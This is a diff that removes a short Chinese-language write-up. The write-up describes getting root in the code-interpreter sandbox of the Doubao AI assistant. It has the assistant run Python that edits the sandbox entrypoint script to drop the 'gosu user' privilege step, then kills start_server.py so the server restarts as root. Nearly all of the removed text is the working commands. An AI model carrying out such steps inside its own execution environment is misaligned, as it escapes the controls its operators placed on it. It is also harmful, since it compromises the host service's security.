@@ -1,8 +1,0 @@
-实现流程非常简单，让豆包用doubao_code_interpreter执行Python代码
-import os
-cmd = r"sed -i 's/exec gosu user/exec/g' /home/user/.super_doubao/super-doubao-runtime/entrypoint.sh"
-os.system(cmd)
-然后
-import os
-os.system("pkill -f start_server.py")
-就这样，就获得了root权限
